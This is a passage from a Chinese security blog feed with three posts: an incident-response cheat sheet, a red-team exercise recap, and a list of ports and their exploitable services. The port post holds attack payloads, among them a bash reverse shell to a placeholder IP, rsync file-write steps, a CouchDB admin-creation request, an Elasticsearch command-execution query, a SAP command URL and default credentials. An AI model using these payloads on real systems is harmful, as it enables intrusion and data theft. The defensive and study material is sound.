导致搜索引擎告警、微信等app分享告警、首页敏感内容、拖库、内网沦陷等排查<br><strong>要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 备份文件;webshell后门查杀;web日志分析;web中间件缓存处理;web中间件配置检查;重启web中间件;服务器后门检查;<br><strong>防护措施:</strong> 加固相关web应用，修改相关系统的所有用户密码</p><h4 id="响应事件——链路劫持"><a href="#响应事件——链路劫持" class="headerlink" title="响应事件——链路劫持"></a>响应事件——链路劫持</h4><p><strong>相关表现:</strong> 区域性服务不可用或返回异常内容<br><strong>相关危害:</strong> 导致搜索引擎告警、微信等app分享告警、首页敏感内容等<br><strong>排查要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 跨地区、运营商进行测试，确定受影响范围:在能复现的环境中判断是DNS劫持还是HTTP劫持<br><strong>防护措施:</strong> 重要业务部署https</p><h4 id="响应事件——代理隧道"><a href="#响应事件——代理隧道" class="headerlink" title="响应事件——代理隧道"></a>响应事件——代理隧道</h4><p><strong>相关表现:</strong> 持续性或间断性外连行为，通常为tcp协议，对内网多个主机有访问行为<br><strong>相关危害:</strong> 作为跳板机攻击其他内网资产<br><strong>排查要点:</strong> 确定存在代理隧道的跳板机，通常为某时间段内集中访问内网多种资源的机器，判断隧道类型<br><strong>防护措施:</strong> 完善内网acl，服务器按业务需要通过白名单策略访问外网</p><h4 id="响应事件——替换系统命令"><a href="#响应事件——替换系统命令" class="headerlink" title="响应事件——替换系统命令"></a>响应事件——替换系统命令</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 使用包管理自带的包校验功能验证文件完整性，分析恶意文件行为，确定影响面<br><strong>操作要点:</strong> 使用静态链接的busybox;重新安装被替换的包<br><strong>命令:</strong> </p><pre><code>rpm -Vadpkg --verify</code></pre><h4 id="响应事件——ld-so-preload动态链接库劫持"><a href="#响应事件——ld-so-preload动态链接库劫持" class="headerlink" title="响应事件——ld.so.preload动态链接库劫持"></a>响应事件——ld.so.preload动态链接库劫持</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 检查/etc/ld.so.preload，ld.so(如/lib/x86_64-linux-gnu/ld-2.27.so)<br><strong>操作要点:</strong> 使用静态链接的busybox; 重启被注入恶意模块的进程，必要时直接重启系统</p><h4 id="响应事件——内核态rootkit"><a href="#响应事件——内核态rootkit" class="headerlink" title="响应事件——内核态rootkit"></a>响应事件——内核态rootkit</h4><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:隐藏文件、进程等信息<br><strong>排查要点:</strong> 确定是否存在无法使用常规命令查看的文件、进程;<br><strong>操作要点:</strong> 使用tyton内核态rootkit检测工具检测:检查/etc/modules是否有未知的内核模块</p><h4 id="响应事件——计划任务"><a href="#响应事件——计划任务" class="headerlink" title="响应事件——计划任务"></a>响应事件——计划任务</h4><p><strong>相关表现:</strong> 特定时间间隔触发木马、后门、网络链接、DNS请求、篡改页面等行为<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:周期性篡改页面、拉取数据等<br><strong>排查要点:</strong> 判断是否存在周期性出现的异常现象，检查/var/spool/cron/crontabs/，/etc/cron.*等常用计划任务配置文件<br><strong>操作要点:</strong> 停止计划任务服务后再操作;注意辨别利用\r回车符的障眼法小技巧</p><h4 id="响应事件——远控木马"><a href="#响应事件——远控木马" class="headerlink" title="响应事件——远控木马"></a>响应事件——远控木马</h4><p><strong>相关表现:</strong> 有持续或间断性的对外网络链接或DNS请求等通信行为<br><strong>相关危害:</strong> 窃取系统资料、作为跳板进一步攻击内网其他机器<br><strong>排查要点:</strong> 关注tcp、udp、icmp等一切网络行为，检查注册表、服务、开机目录、计划任务等一系列常见的持久化点<br><strong>操作要点:</strong> 检查网络连接，以及IDS设备上的异常远控告警</p><h3 id="Windows应急响应"><a href="#Windows应急响应" class="headerlink" title="Windows应急响应"></a>Windows应急响应</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><table><thead><tr><th>常用命令</th><th>说明</th></tr></thead><tbody><tr><td>regedit</td><td>注册表</td></tr><tr><td>Taskmgr</td><td>注册表</td></tr><tr><td>Msconfig</td><td>系统配置(包含启动项)</td></tr><tr><td>eventvwr.msc</td><td>事件查看器</td></tr><tr><td>compmgmt.msc</td><td>计算机管理(本地用户和组)</td></tr><tr><td>gpedit.msc</td><td>本地组策略</td></tr><tr><td>taskschd.msc</td><td>计划任务</td></tr><tr><td>lusrmgr.msc</td><td>本地用户和组</td></tr></tbody></table><pre><code>获取本机用户列表: net user本机管理员: net localgroup administrators查看当前会话: net session查看当前运行的服务: net start远程连接: net use查看当前用户下的共享目录: net share最近打开的文件:%UserProfile%\Recent          %APPDATA%\Microsoft\Windows\Recent          查找文件中的字符串: findstr /m /i /s &quot;hello&quot; *.txt查看网络连接: netstat - ano操作系统的详细配置信息: systeminfo获取系统进程信息: Wmic process根据应用程序查找PID: wmic process where name=&quot;cmd.exe”get processid,executablepath,name根据PID查找应用程序: wmic process where processid=&quot;4296”get executablepath,name获取系统进程信息:tasklist对于要查询特定dll的调用情况，可以使用命令tasklist /m dll名称计算样本MD5: certutil -hashfile %样本文件名% MD5</code></pre><h4 id="应急管理工具"><a href="#应急管理工具" class="headerlink" title="应急管理工具"></a>应急管理工具</h4><p><strong>PChunter</strong><br>系统信息监控工具，主要拿来看数字签名<br>黑色是微软认证的<br>粉红色是未认证的<br>红色是可疑进程</p><p><strong>Autoruns</strong><br>启动项、计划任务等动态监测工具</p><p><strong>Process Explorer</strong><br>应用程序监测工具<br>数据量很大，需要过滤</p><p><strong>TCPView</strong><br>其实就是<code>netstat -ano</code>的输出，但是可视化方便处理</p><p><strong>Microsoft Network Monitor</strong><br>很小的一个流量监控软件<br>安装完需要重启，可以监测单个程序进程</p><p><strong>D盾</strong><br>查杀webshell</p><p><strong>Everything</strong><br>快速查找文件和目录</p><p><strong>sysmon</strong><br>微软开发的系统监控工具，常用来判断挖矿后门等等</p><table><thead><tr><th>ID</th><th>说明</th></tr></thead><tbody><tr><td>Event ID 1</td><td>进程创建事件，恶意进程的创建，包括他的父进程，PID，执行命令及对应文件所在目录记录信息等等</td></tr><tr><td>Event ID 3</td><td>网络连接事件，当恶意程序外连 CC 服务器或者矿地址池等操作的时候，可监控到是哪个进程发起的连接，并找到对应程序所在目录进行清理操作。</td></tr><tr><td>Event ID 11</td><td>文件创建事件，创建或覆盖文件时，这些创建操作会被记录下来。此事件对于监控自动启动位置，如启动文件夹目录、临时目录、下载目录非常有用.，而这些目录正是初始感染阶段恶意运行要用到的目录</td></tr><tr><td>Event ID 22</td><td>记录 DNS 查询，容易受该功能影响的一种场景就是基于 DNS 的 C2 通信，其中大量请求会被记录下来</td></tr></tbody></table><p><strong>威胁分析平台</strong></p><p><strong>BeaconEye</strong><br>监测CS木马后门特征</p><p><strong>DumpIt</strong><br>内存取证工具，需要dump整个系统，取证空间占用太大，不建议使用<br>替代工具:<code>FTK Imager</code>和<code>WinPMem</code></p><p><strong>Volatility</strong><br>内存取证工具</p><h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>windows主要有以下三类日志记录系统事件: 系统日志、安全日志、应用程序日志</p><pre><code>打开方式:1、开始 -&gt; 运行 -&gt; eventvwr2、开始-&gt; 管理工具 -&gt; 事件查看 -&gt; 安全</code></pre><p><strong>系统日志</strong><br>默认位置:%SystemRoot%System32WinevtLogsSystem.evtx</p><table><thead><tr><th>事件</th><th>ID</th></tr></thead><tbody><tr><td>系统启动</td><td>6005</td></tr><tr><td>事件日志服务已启动</td><td>6006</td></tr><tr><td>事件日志服务已停止</td><td>12</td></tr><tr><td>系统关闭</td><td>13</td></tr></tbody></table><p><strong>安全日志</strong><br>%SystemRoot%System32WinevtLogsSecurity.evtx<br>注意：不同版本的系统日志ID可能不同，建议自行查找<br><a href="https://smms.app/image/ZjJkrGV3hI9zd5i" target="_blank"><img src="https://s2.loli.net/2023/07/28/ZjJkrGV3hI9zd5i.png" width="400"></a></p><p><strong>应用程序日志</strong><br>%SystemRoot%System32WinevtLogsApplication.evtx</p><h3 id="Linux应急响应"><a href="#Linux应急响应" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h3><h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><p><strong><code>top</code>和<code>ps -aux</code></strong><br>查看系统资源占用</p><p><strong><code>netstat -antpl</code></strong><br>查看网络连接以及其对应可执行程序</p><p><strong>lsof</strong><br>查看开放端口的进程</p><p><strong>登录信息查看</strong><br>显示错误的尝试登录信息: lastb<br>显示系统用户最近的登录信息: last<br>现实所有的用户最近的登录信息: lastlog</p><p><strong>grep</strong><br>查找符合条件的字符串:netstat -antpl lgrep 22</p><p><strong>crontab</strong><br>查看定时任务: crontab -1 、 cat /etc/crontab</p><p><strong>历史命令</strong><br>查看历史命令: history、cat ~/.bash history</p><p><strong>校验RPM软件包</strong><br>校验RPM软件包: rpm -Va、dpkg -verify<br>S：表示对应文件的大小 (Size) 不一致<br>M: 表示对于文件的mode不一致<br>5:表示对应文件的MD5不一致<br>D:表示文件的major和minor号不一致<br>L:表示文件的符号连接内容不一致<br>U:表示文件的owner不一致<br>G: 表示文件的group不一致<br>T:表示文件的修改时间不一致</p><p><strong>其它</strong><br>登录成功的IP<br>grep “Accepted” /var/log/secure | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more<br>定位有爆破行为的IP<br>grep “Failed password” /var/log/secure awk ‘{print $11}’ | sort | uniq -c | sort -nr | more<br>查看隐藏进程<br>ps -ef  awk ‘{print $11}’ | sort -n | uniq &gt;1<br>ls /proc | sort -n | uniq &gt;2<br>diff 1 2</p><h4 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a>应急工具</h4><p><strong>BusyBox</strong><br>静态链接库的BusyBox<br>当命令被替换时使用<br>赋予可执行权限后.\即可</p><p><strong>chkrootkit</strong><br>监测RootKit的脚本</p><p><strong>Rkhunter</strong><br>同上</p><p><strong>unhide</strong><br>查找隐藏的UDP/TCP进程</p><p><strong>ClamAV</strong><br>检测各种恶意木马，病毒，进程<br>注意是否存在so文件的注入</p><p><strong>河马Webshell</strong></p><h4 id="Web日志分析"><a href="#Web日志分析" class="headerlink" title="Web日志分析"></a>Web日志分析</h4><p><a href="https://smms.app/image/PT3z2eDRXrnEfFA" target="_blank"><img src="https://s2.loli.net/2023/07/28/PT3z2eDRXrnEfFA.png" width="400"></a></p><p><a href="https://smms.app/image/QRHjtKZ7Ulh25iW" target="_blank"><img src="https://s2.loli.net/2023/07/28/QRHjtKZ7Ulh25iW.png" width="400"></a></p><p><a href="https://smms.app/image/uS1eGAtZMsj3p2n" target="_blank"><img src="https://s2.loli.net/2023/07/28/uS1eGAtZMsj3p2n.png" width="400"></a></p><p><a href="https://smms.app/image/j3QUfAiM6x1aJOR" target="_blank"><img src="https://s2.loli.net/2023/07/28/j3QUfAiM6x1aJOR.png" width="400"></a></p><p><strong>查找文件中的恶意/危险函数</strong></p><pre><code>PHP: eval(、system(、assert (JSP: getRunTime(、FileOutputStream(ASP: eval(、execute(、ExecuteGlobal (</code></pre><p><strong>从日志记录中查找</strong><br>查看每个 IP 地址访问次数:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c<br>访问URL排序:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c |sort -rn|head<br>访问指定资源日志:<br>cat access.log |awk ‘{print $7}’ |grep /%25Domain |sort|uniq - c |sort -rn|more</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;应急响应概述&quot;&gt;&lt;a href=&quot;#应急响应概述&quot; class=&quot;headerlink&quot; title=&quot;应急响应概述&quot;&gt;&lt;/a&gt;应急响应概述&lt;/h3&gt;&lt;h4 id=&quot;应急响应流程&quot;&gt;&lt;a href=&quot;#应急响应流程&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>红队总结</title>
    <link href="https://liu1272.github.io/2023/07/13/%E7%BA%A2%E9%98%9F%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2023/07/13/%E7%BA%A2%E9%98%9F%E6%80%BB%E7%BB%93/</id>
    <published>2023-07-13T12:26:00.000Z</published>
    <updated>2023-07-19T13:17:36.757Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这次参加的是广州市的护网红队，跟着师兄一起去的，我一个大一的玩意就不指望能拿shell啥的了。<br>虽然结果排名不高，但是队员们很努力。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>准备</strong><br>首先的话会有提供靶标和虚拟机给你使用，这些机子在上交报告和复现都要用到，其他时候也要挂着VPN。</p><p><strong>信息收集</strong></p><ul><li>先用enscan收集一下企业资产</li><li>使用搜索引擎搜索官网</li><li>在官网上看看各个功能</li><li>使用Wappalyzer查看网站的框架</li><li>用findsomething插件、Find-SomeThing脚本、jjjjjjjjjjjjjs脚本看网页JS信息泄露</li><li>识别git/svn泄露（实在太少而且难以利用）</li><li>使用EHole指纹识别</li><li>dirsearch或者御剑扫描目录，线程不要太高，时间够的不用急</li><li>nmap或者masscan扫端口</li><li><a href="https://rapiddns.io/subdomain">网站1</a>、<a href="https://www.dnsgrep.cn/subdomain/">网站2</a>收集子域名</li><li><a href="https://ping.chinaz.com/">多地点Ping</a>查看真实ip</li><li>zoomeye和shodan根据ip查找（感觉这样子更加准确）</li><li>肉眼分析框架（网上的工具不太会用，手工分析更加方便）</li></ul><p><strong>利用工具检测漏洞</strong></p><ol><li>apt_tools</li><li>LiqunKit</li><li>nuclei</li><li>shiro_attack</li><li>SpringBoot-Scan</li><li>Wpscan</li><li>ThinkphpGUI</li><li>Xray</li><li>神机综合利用工具</li><li>unauthorizedV2未授权检测</li><li>wafw00f识别</li></ol><p><strong>手动检测漏洞</strong></p><ol><li>弱口令爆破</li><li>网页跳转间隔进行未授权访问</li><li>重新审计JS文件寻找未授权</li><li>注册用户文件上传</li><li>更改密码逻辑漏洞</li><li>路径穿越，任意文件读取</li><li>sql注入（渗透中是中危，但是护网中不拿shell、密码或者重要数据的话分数较少）</li><li>伪造token/cookie</li></ol><p><strong>最后</strong><br>收集数据，填写报告上交审核，不过就扯嘴皮。</p><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>因为我们队实力不算很好，还有我这个摸鱼的，所以也没学到特别多的东西，希望以后能跟着大佬一起学习吧。<br>护网的时候拿分应该是有诀窍的，但是俺不知道。<br>信息泄露那成百上千万条估计是个大头，以后红队多注重这方面。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;这次参加的是广州市的护网红队，跟着师兄一起去的，我一个大一的玩意就不指望能拿shell啥的了。&lt;br&gt;虽然结果排名不高，但是队员们很努力。&lt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>常见的端口和对应的服务</title>
    <link href="https://liu1272.github.io/2023/07/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1/"/>
    <id>https://liu1272.github.io/2023/07/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1/</id>
    <published>2023-07-12T12:07:00.000Z</published>
    <updated>2023-07-19T07:32:29.797Z</updated>
    
    <content type="html"><![CDATA[<h4 id="web类"><a href="#web类" class="headerlink" title="web类"></a>web类</h4><p><strong>struts2：</strong><br>太多，略……</p><p><strong>thinkphp：</strong><br><a href="https://smms.app/image/AtUjGFfCBWR9mxz" target="_blank"><img src="https://s2.loli.net/2023/07/19/AtUjGFfCBWR9mxz.png" ></a></p><p><strong>jboss：</strong><br><a href="https://smms.app/image/1sElFjNxyCQTUdw" target="_blank"><img src="https://s2.loli.net/2023/07/19/1sElFjNxyCQTUdw.png" ></a></p><p><strong>ganglia：</strong><br>CVE-2007-6465: 多个跨站脚本攻击漏洞<br>CVE-2012-3448: 未明PHP代码执行漏洞<br>8649端口未授权访问: 通过http协议获取相关监控的xml信息<br>nmap扫描脚本  <code>nmap --script ganglia-info --script-args ganglia-info.timeout=60,ganglia-info.bytes=100000 -p</code></p><p><strong>zabbix：</strong><br>弱口令/默认账号: </p><pre><code>admin:zabbixAdmin:zabbixguest: 空</code></pre><p>ave-2016-10134: sql注入<br>系统命令执行: 管理员登录后Administrator-script-createscript</p><pre><code>bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1</code></pre><h4 id="数据库类（扫描弱口令）"><a href="#数据库类（扫描弱口令）" class="headerlink" title="数据库类（扫描弱口令）"></a>数据库类（扫描弱口令）</h4><p><strong>MSSQL</strong></p><pre><code>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）攻击方法：    爆破：弱口令/使用系统用户    注入参考：    https://www.anquanke.com/post/id/86011</code></pre><p><strong>Oracle</strong></p><pre><code>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）攻击方法：    爆破：弱口令    注入攻击；    漏洞攻击；    -参考：    https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</code></pre><p><strong>MySQL</strong></p><pre><code>默认端口：3306攻击方法：    爆破：弱口令    身份认证漏洞：CVE-2012-2122    拒绝服务攻击    Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意    提权参考：    https://www.seebug.org/appdir/MySQL    http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390    https://xz.aliyun.com/t/1491</code></pre><p><strong>PostgreSQL</strong></p><pre><code>默认端口：5432攻击方法：    爆破：弱口令：postgres postgres    缓冲区溢出：CVE-2014-2669参考：    http://drops.xmd5.com/static/drops/tips-6449.html    https://www.secpulse.com/archives/69153.html</code></pre><p><strong>MongoDB</strong></p><pre><code>默认端口：27017攻击方法：    爆破：弱口令    未授权访问；github有攻击代码；请点击参考：    http://www.cnblogs.com/LittleHann/p/6252421.html    http://www.tiejiang.org/19157.html</code></pre><p><strong>Redis</strong></p><pre><code>攻击方法：    爆破：弱口令    未授权访问+配合ssh key提权；参考：    http://www.alloyteam.com/2017/07/12910/</code></pre><p><strong>SysBase</strong></p><pre><code>默认端口：服务端口5000；监听端口4100；备份端口：4200攻击方法：    爆破：弱口令    命令注入：</code></pre><p><strong>DB2</strong></p><pre><code>默认端口：5000攻击方法：    安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）参考：    http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071</code></pre><h4 id="特殊服务类（未授权-命令执行-漏洞）"><a href="#特殊服务类（未授权-命令执行-漏洞）" class="headerlink" title="特殊服务类（未授权/命令执行/漏洞）"></a>特殊服务类（未授权/命令执行/漏洞）</h4><p><strong>443 SSL心脏滴血</strong><br>该落地是一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。<br>攻击原理是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），导致可以读取的数据比应该允许读取的还多。<br>利用该漏洞，攻击者可以远程读取服务器内存中64K的数据，获取内存中的敏感信息。</p><p><strong>873 Rsync未授权</strong><br>rsync是Linux/Unix下的一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件和目录。<br>由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。</p><pre><code>【列目录】rsync --port=xxx ip::rsync rsync://192.168.241.142:873/【看目录】rsync --port=xxx ip::目录名rsync rsync://192.168.241.142:873/src/【文件下载】rsync --port=xxx ip::目录名 ./rsync -av rsync://192.168.241.142:873/src/etc/passwd ./【文件写入】rsync -av muma.txt rsync://192.168.241.142:873/src/target.txt利用文件上传设置计划任务来反弹shell</code></pre><p><strong>5984 CouchDB未授权</strong></p><p>CVE-2017-12635权限绕过：到/_utils 目录下验证登陆,后续使用反弹shell进行进一步利用</p><pre><code>PUT /_users/org.couchdb.user:vulhub&#123;  &quot;type&quot;: &quot;user&quot;,  &quot;name&quot;: &quot;vulhub&quot;,  &quot;roles&quot;: [&quot;_admin&quot;],  &quot;roles&quot;: [],  &quot;password&quot;: &quot;vulhub&quot;&#125;</code></pre><p><strong>6379 redis未授权</strong><br><code>./redis-cli -h ip</code>  直接连接就行了</p><p><strong>7001、7002 weblogic默认弱口令、反序列化</strong></p><pre><code>【登录页面】http://ip:7001/console/login/LoginForm.jsp【默认密码】weblogic Oracle@123【反序列化漏洞】http://ip:7001/_async/AsyncResponseService</code></pre><p><strong>9200、9300 ElasticSearch未授权、命令执行漏洞</strong></p><pre><code>【未授权】http://localhost:9200/rvier/search 查看敏感信息了 http://localhost:9200/_plugin/head/ web管理界面 http://localhost:9200/_cat/indices 查看所有的index http://localhost:9200/river/search 查看数据库敏感信息 http://localhost:9200/_nodes 查看节点数据【命令执行】POST /_search?pretty HTTP/1.1&#123;    &quot;size&quot;: 1,    &quot;query&quot;: &#123;      &quot;filtered&quot;: &#123;        &quot;query&quot;: &#123;          &quot;match_all&quot;: &#123;          &#125;        &#125;      &#125;    &#125;,    &quot;script_fields&quot;: &#123;        &quot;command&quot;: &#123;            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;        &#125;    &#125;&#125;    &#125;&#125;</code></pre><p><strong>11211 memcache未授权访问</strong><br><code>telnet ip port</code> 直接连接</p><p><strong>50000 SAP命令执行</strong></p><pre><code>https://XXX/ctc/servlet/ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=id</code></pre><p><strong>50070、50030 hadoop默认端口未授权访问</strong></p><pre><code>http://ip:port/cluster后续上传文件反弹shell利用</code></pre><h4 id="常见的端口漏洞"><a href="#常见的端口漏洞" class="headerlink" title="常见的端口漏洞"></a>常见的端口漏洞</h4><table><thead><tr><th>端口</th><th>服务</th><th>描述</th></tr></thead><tbody><tr><td>21</td><td>ftp</td><td>FTP服务端，存在匿名未授权访问和爆破风险</td></tr><tr><td>22</td><td>ssh</td><td>SSH服务端，存在root密码爆破和后门用户的风险</td></tr><tr><td>23</td><td>telnet</td><td>Telnet服务端，常见于路由器、交换机和嵌入式设备，存在弱口令风险</td></tr><tr><td>25</td><td>smtp</td><td>SMTP服务端，可能存在默认用户和默认密码，需要防止邮件账号爆破</td></tr><tr><td>80</td><td>http</td><td>HTTP Web服务，常见的漏洞包括中间件反序列化、FastCGI配置不当等</td></tr><tr><td>110</td><td>pop3</td><td>POP3服务端，可能存在默认用户和默认密码，需要防止邮件账号爆破</td></tr><tr><td>443</td><td>https</td><td>HTTPS服务端，可能受影响的漏洞包括OpenSSL的心脏滴血和SSL/TLS低版本漏洞</td></tr><tr><td>135</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>139</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>445</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>3389</td><td>RDP</td><td>RDP服务，可能受CVE-2019-0708漏洞的影响</td></tr></tbody></table><h4 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h4><table><thead><tr><th>端口</th><th>对应的服务</th><th>存在的相关漏洞</th></tr></thead><tbody><tr><td>21/69</td><td>ftp/tftp：文件传输协议</td><td>爆破,嗅探溢出,后门,匿名访问</td></tr><tr><td>22</td><td>ssh</td><td>爆破,openssh漏洞</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>弱口令,未授权访问,邮件伪造</td></tr><tr><td>53</td><td>dns：域名系统</td><td>dns区域传输,劫持,缓存投毒,隧道技术刺透防火墙</td></tr><tr><td>80/8080</td><td>apache/tomcat/nginx/axis2</td><td>爆破弱口令,http慢速攻击,解析漏洞</td></tr><tr><td>80/443/8080</td><td>web</td><td>常见web攻击,控制台爆破,对应服务器版本漏洞</td></tr><tr><td>80/81/443</td><td>IIS</td><td>put写文件,短文件名漏洞,解析漏洞</td></tr><tr><td>110</td><td>pop3</td><td>弱口令</td></tr><tr><td>123</td><td>ntp</td><td>ntp放大攻击</td></tr><tr><td>137/139</td><td>samba</td><td>爆破,未授权访问,远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>弱口令</td></tr><tr><td>1521</td><td>oracle</td><td>爆破注入攻击</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ladp</td><td>注入攻击,未授权访问,爆破</td></tr><tr><td>443</td><td>https</td><td>心脏滴血</td></tr><tr><td>445</td><td>smb</td><td>溢出漏洞</td></tr><tr><td>512</td><td>linux r</td><td>rlogin远程登录</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破:进行内网渗透</td></tr><tr><td>1098</td><td>javarmi</td><td>命令执行</td></tr><tr><td>1352</td><td>lotus</td><td>爆破信息泄露跨站脚本攻击</td></tr><tr><td>1433</td><td>mssql</td><td>爆破,注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>未授权访问</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>2222</td><td>da</td><td>da虚拟主机</td></tr><tr><td>2601</td><td>zebra</td><td>默认密码</td></tr><tr><td>3128</td><td>squid</td><td>空口令</td></tr><tr><td>3306</td><td>mysql</td><td>漏洞：爆破,拒绝服务,注入</td></tr><tr><td>3389</td><td>rdp/windows远程连接</td><td>爆破,shift后门,3389漏洞攻击</td></tr><tr><td>4100</td><td>sysbase</td><td>弱口令</td></tr><tr><td>4440</td><td>rundeck</td><td>弱口令</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破认证绕过</td></tr><tr><td>5000</td><td>sybase/db2</td><td>弱口令命令,注入</td></tr><tr><td>5422</td><td>postgresql</td><td>弱口令</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出,注入攻击,爆破</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务,代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破,认证口令绕过,拒绝服务攻击,权限提升</td></tr><tr><td>5984</td><td>couchdb</td><td>命令执行</td></tr><tr><td>6082</td><td>varnish</td><td>未授权访问</td></tr><tr><td>6379</td><td>redis</td><td>弱口令,未授权访问</td></tr><tr><td>7001</td><td>weblofic</td><td>爆破,弱口令(system/system,weblogic/weblogic),congsole后台部署webshell,java反序列化泄漏源代码/列目录,ssrf窥探内网,命令执行</td></tr><tr><td>8000</td><td>jdwp</td><td>命令执行</td></tr><tr><td>8069</td><td>zabbix</td><td>命令执行</td></tr><tr><td>8080</td><td>apache/tomcat/nginx/axis2/jboss中间件</td><td>弱口令命令执行</td></tr><tr><td>8080</td><td>jboss,其他端口：1098/1099/4444/4445/8080/8009/8083/8093</td><td>爆破,远程代码执行,java反序列化</td></tr><tr><td>8080</td><td>glassfish,其他端口：iiop：3700；控制台：4848</td><td>爆破,任意文件读取,认证绕过</td></tr><tr><td>8080</td><td>resin</td><td>目录遍历,远程代码执行</td></tr><tr><td>8080/8089</td><td>jenkis</td><td>爆破,未授权访问,反序列化</td></tr><tr><td>8080</td><td>jetty</td><td>远程共享,缓冲区溢出</td></tr><tr><td>8161</td><td>activemq</td><td>文件上传</td></tr><tr><td>8649</td><td>ganglia</td><td>未授权访问,信息泄露</td></tr><tr><td>8980</td><td>opennms</td><td>反序列化漏洞</td></tr><tr><td>9080</td><td>websphere</td><td>弱口令,反序列化,文件泄露</td></tr><tr><td>9090</td><td>websphere</td><td>控制台爆破,反序列化java</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行,未授权访问</td></tr><tr><td>11211</td><td>memcache</td><td>未授权访问</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破,未授权</td></tr><tr><td>27018</td><td>mongodb</td><td>未授权</td></tr><tr><td>50000</td><td>sap</td><td>命令执行</td></tr><tr><td>50010</td><td>hadoop</td><td>信息泄露命令执行</td></tr><tr><td>50030</td><td>hadoop</td><td>未授权访问</td></tr><tr><td>50070</td><td>hadoop</td><td>未授权访问</td></tr><tr><td>512/513/514</td><td>linux 